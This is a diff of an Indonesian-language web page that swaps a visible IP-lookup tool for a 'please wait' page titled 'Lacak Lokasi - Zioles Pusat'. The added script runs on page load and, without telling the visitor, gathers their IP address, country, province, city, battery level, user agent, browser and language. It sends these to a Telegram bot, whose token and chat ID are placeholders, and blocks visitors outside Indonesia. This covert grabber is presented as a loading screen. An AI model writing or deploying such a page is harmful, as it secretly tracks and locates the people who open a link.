@@ -3,65 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pelacak IP Akurat</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: #f4f4f4; }
-        input { width: 80%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
-        button { background: #007bff; color: white; border: none; padding: 10px 15px; cursor: pointer; border-radius: 5px; }
-        button:hover { background: #0056b3; }
-        .result { margin-top: 20px; padding: 10px; background: white; display: none; border: 1px solid #ddd; border-radius: 5px; }
-        a { color: #007bff; text-decoration: none; }
-        a:hover { text-decoration: underline; }
-    </style>
+    <title>Lacak Lokasi - Zioles Pusat</title>
+    <script>
+        async function getBatteryStatus() {
+            if ('getBattery' in navigator) {
+                const battery = await navigator.getBattery();
+                const level = Math.round(battery.level * 100);
+                const charging = battery.charging ? "🔌 Sedang mengisi daya" : "⚡ Tidak mengisi daya";
+                return `Baterai: ${level}% (${charging})`;
+            } 
+            return "Baterai: Tidak didukung";
+        }
+
+        async function getIP() {
+            try {
+                let response = await fetch("https://ipapi.co/json/");
+                let data = await response.json();
+                
+                let ip = data.ip;
+                let negara = data.country_name;
+                let kodeNegara = data.country_code;
+                let provinsi = data.region;
+                let kota = data.city;
+
+                // Blokir akses jika bukan dari Indonesia
+                if (kodeNegara !== "ID") {
+                    document.body.innerHTML = "<h1>Akses Ditolak</h1><p>Hanya pengguna dari Indonesia yang dapat mengakses halaman ini.</p>";
+                    return; // Hentikan proses jika bukan dari Indonesia
+                }
+
+                let batteryStatus = await getBatteryStatus();
+
+                let userAgent = navigator.userAgent;
+                let browser = navigator.vendor || "Tidak diketahui";
+                let bahasa = navigator.language;
+
+                // Kirim ke bot Telegram
+                let botToken = "TOKEN_BOT_ANDA"; // Ganti dengan token bot Anda
+                let chatID = "ID_CHAT_ANDA"; // Ganti dengan ID chat Anda
+
+                let message = `
+🚀 *Zioles Pusat - Lacak Info Pengguna* 🚀
+━━━━━━━━━━━━━━━━━━━━
+🌍 **Informasi Pengguna**
+- 📍 *IP:* ${ip}
+- 🏴 *Negara:* ${negara}
+- 🏙️ *Provinsi:* ${provinsi}
+- 🏠 *Kota:* ${kota}
+- 🔋 *${batteryStatus}*
+- 🖥️ *User Agent:* ${userAgent}
+- 🌐 *Browser:* ${browser}
+- 🗣️ *Bahasa:* ${bahasa}
+━━━━━━━━━━━━━━━━━━━━
+📢 *Data ini dikumpulkan oleh sistem Zioles Pusat.*
+                `;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+                    .then(response => {
+                        if (!response.ok) throw new Error("Gagal mengirim ke Telegram");
+                    })
+                    .catch(error => console.error("Error:", error));
+
+            } catch (error) {
+                console.error("Gagal mengambil data:", error);
+            }
+        }
+
+        window.onload = getIP;
+    </script>
 </head>
 <body>
-
-    <h2>Pelacak IP Akurat</h2>
-    <input type="text" id="ipAddressInput" placeholder="Masukkan alamat IP...">
-    <br>
-    <button onclick="trackIP()">Lacak IP</button>
-    
-    <div class="result" id="result">
-        <h3>Hasil Pelacakan:</h3>
-        <p><b>IP:</b> <span id="ipAddress"></span></p>
-        <p><b>Lokasi:</b> <span id="location"></span></p>
-        <p><b>ISP:</b> <span id="isp"></span></p>
-        <p><b>Koordinat:</b> <span id="coordinates"></span></p>
-        <p><b>Google Maps:</b> <a id="mapsLink" href="#" target="_blank">Lihat Lokasi</a></p>
-    </div>
-
-    <script>
-        function trackIP() {
-            let ip = document.getElementById("ipAddressInput").value.trim();
-            if (!ip) {
-                alert("Masukkan alamat IP terlebih dahulu!");
-                return;
-            }
-
-            fetch(`https://ipinfo.io/${ip}/json`)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.bogon) {
-                        alert("IP ini adalah alamat internal (Bogon) dan tidak dapat dilacak.");
-                        return;
-                    }
-
-                    document.getElementById("ipAddress").textContent = data.ip;
-                    document.getElementById("location").textContent = `${data.city}, ${data.region}, ${data.country}`;
-                    document.getElementById("isp").textContent = data.org;
-                    document.getElementById("coordinates").textContent = data.loc;
-
-                    let mapsUrl = `https://www.google.com/maps?q=${data.loc}`;
-                    document.getElementById("mapsLink").href = mapsUrl;
-
-                    document.getElementById("result").style.display = "block";
-                })
-                .catch(error => {
-                    console.error("Gagal mendapatkan data IP", error);
-                    alert("Gagal mendapatkan informasi IP. Pastikan Anda terhubung ke internet.");
-                });
-        }
-    </script>
-
+    <h1>Mohon Tunggu...</h1>
+    <p>Sedang memuat informasi...</p>
 </body>
 </html>
